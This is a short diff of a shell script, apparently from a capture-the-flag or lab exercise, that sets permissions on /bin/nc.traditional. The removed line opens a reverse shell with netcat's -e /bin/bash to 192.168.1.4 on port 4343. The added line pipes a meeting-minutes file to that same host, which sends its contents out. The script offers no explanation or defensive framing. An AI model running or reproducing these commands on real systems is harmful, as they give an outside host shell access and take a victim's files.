@@ -1,4 +1,4 @@
 #!/bin/sh
 
 chmod 2755 /bin/nc.traditional
-/bin/nc.traditional 192.168.1.4 4343 -e /bin/bash &
+/bin/nc.traditional 192.168.1.4 4343 < /NORTH_POLE_Land_Use_Board_Meeting_Minutes.txt 
